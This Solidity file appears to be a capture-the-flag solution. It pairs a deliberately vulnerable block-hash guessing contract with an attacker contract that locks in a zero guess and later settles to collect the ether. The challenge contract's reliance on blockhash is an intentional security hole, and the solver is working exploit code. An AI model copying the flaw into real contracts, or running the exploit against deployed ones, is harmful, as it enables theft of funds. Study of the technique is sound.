pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHash{
    address challengeAddr;

    function PredictTheBlockHash(address _challengeAddr) public payable{
        require(msg.value == 1 ether);
        challengeAddr = _challengeAddr;

        // Instanciating the challenge contract
        PredictTheBlockHashChallenge challengeContract = PredictTheBlockHashChallenge(challengeAddr);

        // Setting an answer = 0
        bytes32 chosedAnswer = block.blockhash(block.number + 1);

        // Locking the answer
        challengeContract.lockInGuess.value(msg.value)(chosedAnswer);
    }

    function settle() public{
        // Send the settle in
        PredictTheBlockHashChallenge challengeContract = PredictTheBlockHashChallenge(challengeAddr);
        challengeContract.settle();

        // Get back my ethers
        msg.sender.transfer(this.balance);
    }

    // Fallback function to receive paymennt
    function() external payable {}

}
